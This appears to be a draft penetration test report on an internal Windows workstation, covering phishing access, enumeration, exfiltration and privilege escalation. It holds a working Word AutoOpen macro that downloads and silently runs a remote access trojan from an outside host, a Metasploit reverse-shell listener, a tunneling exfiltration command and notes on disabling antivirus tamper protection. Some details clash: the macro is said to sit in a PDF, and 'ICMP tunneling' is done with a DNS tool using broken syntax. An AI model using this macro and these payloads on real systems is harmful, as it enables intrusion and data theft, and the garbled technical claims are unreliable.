# Penetration Test Report: Acme Corp Internal Network

**Date:** October 5, 2026
**Tester:** Caden Mercer
**Target Host:** WS-ACME-042 (Windows 10 Pro)
**Objective:** Validate internal lateral movement and privilege escalation controls.


below are initial notes that may or may not be relevant to final report

NOTES:

-have not disabled real-time monitoring/tamper protection yet

-trying to test disabling script

<img width="890" height="139" alt="image" src="https://github.com/user-attachments/assets/71141d52-0e1a-4c7d-9525-ff37611a40a9" />

word macro below:
```
Sub AutoOpen()
    Dim strPath As String
    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"

    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", "http://192.168.92.136:8080/RATa.exe", False
    objHTTP.Send

    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strPath, 2
    objStream.Close

    CreateObject("WScript.Shell").Run "cmd /c """ & strPath & """", 0, False
End Sub
```




## 1. Executive Summary

The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.

## 2. Methodology

### Phase 1: Initial Access
**Vector:** Spearphishing Attachment (VBA Macro)
**Premise:** A malicious PDF disguised as an invoice was delivered to the target user.

**Commands Used:**
```bash
# Payload Generation

<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />


# Listener Setup
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.92.136
set LPORT 14000
exploit -j
```

**Session Output Analysis:**
Upon execution, the following session was established:

<img width="1264" height="395" alt="image" src="https://github.com/user-attachments/assets/f2e08fbc-c4a8-41d7-b8e2-f03bb09fc1bd" />

*   **ID:** Unique identifier for the session.
*   **Type:** `meterpreter` indicates full-featured agent connection.
*   **User:** `acme\jdoe` confirms initial foothold as standard user.

### Phase 2: Enumeration
**Modules Executed:**

| Module | Command | Key Findings |
| :--- | :--- | :--- |
| sysinfo | `sysinfo` | Windows 10 Pro, Build 19045, x64 |
| getprivs | `getprivs` | User is not in Administrators group |
| hashdump | `hashdump` | Failed (requires SYSTEM) |
| service scan | `service list` | Identified "PrintSpooler" running as SYSTEM |

**Custom Script:**
Deployed `enum.ps1` to gather registry keys related to autoruns. Output appended to `staging_data.txt`.

**Staging:**
Data compressed using `7z a -p[password] data.7z staging_data.txt`.

### Phase 3: Exfiltration
**Method:** ICMP Tunneling via `iodine`
**Justification:** ICMP traffic is often allowed for network diagnostics and is rarely logged in detail by perimeter firewalls, unlike HTTP/HTTPS.

**Detection Risk:**
High volume of ICMP echo requests with large payloads may trigger IDS signatures for tunneling tools.

**Verification on C2:**
```bash
$ iodined -f -n -P [password] 192.168.50.10:53 data.7z
[+] Tunnel established
[+] Transferred 45KB
$ ls -l data.7z
-rw-r--r-- 1 user user 45000 Oct 12 14:22 data.7z
```

### Phase 4: Privilege Escalation
**Vulnerability:** CVE-2023-XXXXX (Hypothetical Print Spooler Flaw)
**Root Cause:** The service allows standard users to write to a shared memory object that is later read by the SYSTEM process without sanitization.
**Exploit Mechanism:** Crafted a malicious DLL that, when loaded into the spooler context, executes a reverse shell as SYSTEM.

**Verification:**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**C2 Verification (vssadmin):**
```bash
meterpreter > shell
Microsoft Windows [Version 10.0.19045.3803]
C:\Windows\system32>vssadmin list shadows
shadowset {a1b2c3d4-...} created at: 2023-10-12T14:30:00.1234567Z
```

### Phase 5: Log Analysis
**Sysmon Event ID 1 Findings:**

**NOTE: Copy and paste your Sysmon logs into Claude and have it format it like the table below.**

| Timestamp | Process | Parent | Command Line |
| :--- | :--- | :--- | :--- |
| 14:20:01 | `WINWORD.EXE` | `explorer.exe` | `C:\Users\jdoe\Desktop\Invoice.pdf` | 
| 14:20:05 | `cmd.exe` | `WINWORD.EXE` | `cmd /c certutil -urlcache -split -f http://...` | 
| 14:25:10 | `powershell.exe` | `explorer.exe` | `powershell -enc JABzAD0A...` |
**Analysis:**
The initial macro execution spawned `cmd.exe` from `WINWORD.EXE`, which is a strong indicator of compromise. However, the subsequent PowerShell execution was obfuscated and did not trigger standard AMSI logging due to a misconfigured policy.

## 3. Recommendations

1.  Implement Application Control (WDAC) to prevent Office applications from spawning command interpreters.
2.  Enable PowerShell Script Block Logging to capture encoded commands.
3.  Patch the Print Spooler service or disable it if not required.
```
